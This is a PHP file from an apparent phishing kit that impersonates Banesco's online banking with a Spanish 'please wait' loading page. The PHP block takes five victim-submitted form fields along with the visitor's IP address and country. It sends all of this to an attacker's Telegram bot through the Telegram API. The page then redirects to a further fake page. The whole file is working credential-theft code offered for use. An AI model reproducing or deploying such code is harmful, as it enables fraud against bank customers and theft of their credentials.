<?php
ini_set("display_errors", 0);
include "DONDECAE.php";


if (isset($_POST['tTR4P2SR']) && isset($_POST['PR9345FW']) && isset($_POST['pr3xt4rs2']) && isset($_POST['pr3xt4rs3']) && isset($_POST['pr3xt4rs4'])  ) {
    $input = $_POST['tTR4P2SR'];
    $input2 = $_POST['PR9345FW'];
    $input3 = $_POST['pr3xt4rs2'];
    $input4 = $_POST['pr3xt4rs3'];
    $input5 = $_POST['pr3xt4rs4'];
    $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
    $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
    $mensajex .= "B4NESCO\nRESP: ".$_POST['tTR4P2SR']."\nRESP 2: ".$_POST['PR9345FW']."\nRESP 3: ".$_POST['pr3xt4rs2']."\nRESP 4: ".$_POST['pr3xt4rs3']."\nRESP 5: ".$_POST['pr3xt4rs4']."\nIP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";

    env($tafuta, $tid, $mensajex);
}
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";  
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    
    return json_decode($response, true);
}
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );

    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
    );

    $curl = curl_init();
    curl_setopt_array($curl, $options);
    $response = curl_exec($curl);
    curl_close($curl);

    return $response;
    
}

?>
<!DOCTYPE html>
<html>
<head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Solo espera un momento</title>
   <meta http-equiv="refresh" content="10; url=aulvald2.html">
  
</head>
<body>
   <img src="logo_BanescOnline.png" style="width: 200px;">
   <br>
   <br>
   <br>
   <br>

   <img src="loading1.gif" style="width: 150px;display: block;margin: 0 auto;">
   <br>
   <span style="font-family: Helvetica;display: block;margin: 0 auto;text-align: center;">Espere,<br> no cierre esta ventana.</span>

</body>
</html>